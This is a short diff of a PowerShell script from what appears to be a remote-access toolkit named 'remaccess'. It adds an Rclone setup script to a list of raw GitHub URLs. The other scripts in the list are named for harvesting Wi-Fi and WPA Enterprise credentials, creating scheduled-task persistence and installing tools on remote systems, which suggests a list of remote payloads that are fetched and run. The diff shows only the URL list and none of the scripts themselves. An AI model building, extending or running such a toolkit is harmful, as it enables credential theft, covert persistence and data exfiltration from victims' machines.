@@ -54,6 +54,7 @@ $actions = @(
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Miscellaneous/RcloneSetup.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WPAEnterpriseCredentialsHarvester.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Aria2InstallForRemoteSystems.ps1",
     "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/YogaDNSInstall.ps1",
